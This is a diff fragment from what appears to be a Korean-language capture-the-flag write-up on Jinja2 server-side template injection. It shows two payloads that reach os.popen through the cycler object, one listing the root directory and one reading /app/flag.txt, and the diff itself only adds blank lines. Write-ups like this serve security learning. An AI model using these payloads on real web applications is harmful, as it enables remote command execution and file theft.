@@ -63,12 +63,14 @@ Jinja2에는 기본 제공 객체들이 존재하고, 그 중 `cycler`를 통해
 
 ```bash
 {{ cycler.__init__.__globals__.os.popen('ls -al /').read() }}
+
 ```
 
 #### (2) Flag
 플래그는 `/app/flag.txt`에 존재했으며, `cat`으로 직접 읽었다:
 ```bash
 {{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read() }}
+
 ```
 
 ---
